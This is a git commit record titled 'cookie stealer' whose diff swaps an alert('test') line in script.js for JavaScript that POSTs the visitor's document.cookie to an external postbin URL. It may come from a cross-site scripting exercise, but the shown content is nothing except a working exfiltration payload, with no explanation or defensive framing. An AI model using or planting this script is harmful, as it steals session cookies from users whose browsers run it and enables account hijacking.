314e6a691b8e427e4633f9632cc04456778a452b
Viktor Vasylkovskyi <viktor.vasylkovskyi@tecnico.ulisboa.pt>
2022-01-29 10:40:00 +0000

    cookie stealer

--- script.js
+++ script.js
@@ -1,1 +1,7 @@
-alert("test")
+
+
+var xhr=new XMLHttpRequest(); 
+xhr.open("POST", "https://www.toptal.com/developers/postbin/1643452826051-2289256423246"); 
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+xhr.send('cookie=' + document.cookie);
